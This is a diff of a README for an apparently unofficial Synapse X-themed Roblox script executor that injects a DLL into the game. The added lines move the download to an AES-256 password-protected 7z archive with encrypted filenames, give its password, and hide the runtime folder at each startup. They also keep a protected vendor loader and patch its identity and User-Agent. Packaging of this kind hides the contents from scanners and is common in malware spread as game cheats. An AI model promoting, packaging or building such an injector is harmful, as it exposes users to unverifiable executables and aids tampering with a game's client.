@@ -3,7 +3,7 @@
 An unofficial Synapse X inspired interface for the supplied Windows application.
 This project is not affiliated with the original Synapse X developers.
 
-**[Download v1.3.5 compatibility test](https://github.com/j4522419-code/synapse-x-potassium-theme/releases/tag/v1.3.5)**
+**[Download v1.3.6 compatibility candidate](https://github.com/j4522419-code/synapse-x-potassium-theme/releases/tag/v1.3.6)**
 
 This candidate addresses a possible filename regression in v1.3.4. Live attachment
 on the affected PC is still required to confirm whether it resolves the error.
@@ -12,30 +12,25 @@ on the affected PC is still required to confirm whether it resolves the error.
 
 The preview shows the actual Settings component in the browser test harness.
 
-## Version 1.3.5 — compatibility test
+## Version 1.3.6 — one runtime folder and encrypted download
 
-A failure with error `2147549194` was reported in the themed build while the
-unmodified vendor build attaches successfully on the same PC. The submitted
-files match the current vendor 2.5.4 loader and the expected v1.3.4 DLL patch.
-This rules out stale runtime versions, but not filename or DLL-patch compatibility.
+- Remove the redundant root `bin` and the mirror/seed copies. The package and
+  launcher now use only `app/core/bin`; updates do not recreate another folder.
+- Mark that folder Hidden in the archive and refresh its Hidden attribute at
+  startup and after runtime preparation. Users can reveal hidden files; this
+  does not restrict access or change Windows permissions or Explorer settings.
+- Distribute a password-protected `.7z` archive with AES-256 encryption and
+  encrypted filenames. Extract with 7-Zip using **`noob1234@`**.
+- Keep the exact v1.3.5 DLL/loader bytes and original native filenames. Those
+  internal vendor names are retained for compatibility; do not rename them.
+- Keep runtime identity **SYNAPSE X MADE BY GRAND / 1.3.4-grand**.
 
-This candidate reverses the native filename changes first:
+Extract into a **fresh folder**. Old copies are not deleted automatically, so
+extracting over an earlier version can leave its old root `bin` behind.
 
-- Restore the original native downloader and launch filename references.
-- Seed internal `Potassium.exe` / `Potassium.dll` copies in `app/core/bin` before
-  starting the interface, preserving the protected loader's original basename
-  and neighboring-file layout.
-- Keep visible **Synapse X.exe** / **Synapse X.dll** copies in the root `bin`
-  folder and synchronize them after verified runtime preparation.
-- Keep the exact uploaded DLL and loader bytes unchanged. The retained runtime
-  identity stays **SYNAPSE X MADE BY GRAND / 1.3.4-grand** to isolate this test.
-- Preserve existing native runtime copies during seeding, so startup does not
-  downgrade a previously downloaded runtime.
-
-The internal vendor names are a compatibility exception. Do not rename those
-generated files. Layout creation, mirrors, preserved settings, native filename
-references and package integrity passed isolated checks. **The injection error
-is not yet confirmed fixed; no live attachment was run.**
+The reported injection error `2147549194` is still not confirmed fixed. This
+release retains v1.3.5's original runtime filenames and does not introduce
+further runtime patches. Live attachment on the affected PC remains untested.
 
 ## Retained interface features
 
@@ -52,8 +47,6 @@ is not yet confirmed fixed; no live attachment was run.**
   unrelated pins alone. Launch the new root executable once after upgrading to
   migrate old pins. The compatibility entry at `app/Synapse X.exe` also redirects
   automatically to the root launcher.
-- Keep visible runtime copies named **Synapse X.dll** and **Synapse X.exe**.
-  Internal compatibility copies retain the protected vendor component's names.
 - Include verified catalog rules for both inspected vendor runtime versions,
   retaining the earlier rules for existing installations. Identity remains
   **SYNAPSE X MADE BY GRAND**; the retained rules report **1.3.4-grand**.
@@ -81,10 +74,10 @@ core. The supplied runtime and live Roblox attachment remain untested.
 
 ## Install
 
-1. Download `Synapse-X-v1.3.5-windows-x64.zip` from the release’s **Assets**.
-2. Extract the **complete ZIP** into a new folder, including both `app` and `bin` folders.
+1. Download `Synapse-X-v1.3.6-windows-x64.7z` from the release’s **Assets**.
+2. Use [7-Zip](https://www.7-zip.org/) to extract the complete archive into a **fresh folder**, with password **`noob1234@`**.
 3. Restart Roblox to unload an older runtime.
-4. Open the **top-level Synapse X.exe**, keeping both `app` and `bin` beside it.
+4. Open the **top-level Synapse X.exe**, keeping the complete `app` folder beside it.
 
 The root executable launches the interface inside `app/core`, prepares compatibility
 updates, and hosts the Windows error window. Windows x64 with .NET Framework 4.x
@@ -126,7 +119,15 @@ Synapse X branding. This edition keeps its own frontend preferences and tabs.
 
 ## Source and verification
 
-The release ZIP is the runnable package. GitHub’s source-code ZIP contains the
+Current packaging checks verify rejection of an incorrect password for listing
+and extraction, a correct-password extraction of all 12 files, preserved Hidden
+attributes, exactly one runtime folder and byte-for-byte matches to the package.
+Startup fixtures verify the one-folder layout and original working directory.
+Updater checks verify no duplicate root bin is recreated. See
+[archive checks](docs/archive-verification.json) and
+[layout checks](docs/runtime-layout-verification.json).
+
+The password-protected release `.7z` is the runnable package. GitHub’s source-code ZIP contains the
 documentation, theme assets and [launcher source](launcher/AttachErrorHost.cs),
 not the full recovered native application source. Check the download against
 `SHA256SUMS.txt` on the same release.
@@ -147,8 +148,8 @@ the existing internal-menu patch and changes its shared identification function
 and default HTTP User-Agent value. The native GUI retains the original vendor runtime filenames in its
 download and launch references. The [identity patch source](theme/runtime-identity.py)
 is included for review. All other runtime bytes match the inspected source,
-apart from the documented menu patch and PE checksum. Runtime filenames changed;
-the protected helper executable itself remains byte-for-byte unchanged.
+apart from the documented menu patch and PE checksum. The protected helper
+executable and original internal filenames remain unchanged.
 
 Isolated CPU emulation checks both Lua string returns, the HTTP User-Agent's
 actual string allocation/cleanup, stack integrity and saved registers. Updater
